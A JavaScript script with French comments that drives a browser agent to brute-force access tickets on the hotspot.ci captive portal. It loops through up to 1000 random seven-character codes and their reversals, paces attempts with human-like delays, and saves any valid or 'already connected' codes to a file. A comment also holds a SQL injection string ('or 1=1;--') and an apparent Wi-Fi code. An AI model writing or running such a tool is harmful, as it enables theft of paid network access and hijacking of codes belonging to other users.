import Agent from "./dependance/agent.js";
import Helper from "./dependance/Helper.js";

const agent = new Agent()

await agent.initialize()
// l'utilisateur sem12 est déjà connecté su un téléphone
/* code wifi actuelle 18/04/2026 4jzfngw,
select * from ticket where user= '' and pass='df' or 1=1;--'
*/

const path_save_code_valide = 'code-valide.json'
const code_valide = await Helper.readJson(path_save_code_valide)

// Code valide mais déjà utilisé sur un autre appareil → sauvegarder et continuer
const MESSAGES_DEJA_CONNECTE = [
    'déjà connecté',
    'already connected',
    'already logged',
    'session active',
];

function isDejaConnecte(message) {
    const msg = (message || '').toLowerCase();
    return MESSAGES_DEJA_CONNECTE.some(m => msg.includes(m));
}

async function saveCode(code, message) {
    code_valide.push({ code, message });
    await Helper.saveJson(code_valide, path_save_code_valide);
    console.log(`✅ Code sauvegardé: ${code} | ${message}`);
}

const SUCCESS_URLS = [
    'http://hotspot.ci/success.html',
    'http://hotspot.ci/status',
];

async function isAlreadyConnected() {
    return agent.isConnected();
}

async function testTicket(ticket) {
    const tickets = [
        ticket,
        Helper.makeTicket({ code: ticket, revert: true }),
    ];

    for (const t of tickets) {
        // Vérifier si on est déjà connecté avant de tenter
        if (await isAlreadyConnected()) return true;

        console.log(`code => ${t}`);
        const [res, message] = await agent.loginWithTicket(t);
        console.log(`resultat: ${res} | message:${message}`);

        // Vérifier l'URL après la tentative
        const url = agent.page?.url() || '';
        const connectedByUrl = SUCCESS_URLS.some(u => url.startsWith(u));

        if (connectedByUrl) {
            await saveCode(t, `Connexion réussie (${url})`);
            return true; // Arrêt — on est vraiment connecté
        }

        if (res || isDejaConnecte(message)) {
            await saveCode(t, message);
            // "déjà connecté" → code valide sauvegardé mais on continue
        }

        await Helper.sleepHuman(2);
    }
}



let i = 1
while (true) {
    console.log(`-------------tour ${i}--------------- `)

    // Arrêt immédiat si on est déjà connecté en début de tour
    if (await isAlreadyConnected()) {
        console.log(`🌐 Déjà connecté (${agent.page.url()}) — arrêt du programme.`);
        break;
    }

    const ticket = Helper.makeTicket({ lower: true, minLen: 7, maxLen: 7 })
    const res = await testTicket(ticket)

    if (res) {
        console.log(`🎯 Code valide trouvé — arrêt du programme.`);
        break;
    }
    if (i == 1000) {
        console.log(`fin d'iteration.`);
        break;
    }

    i++
}

await agent.close()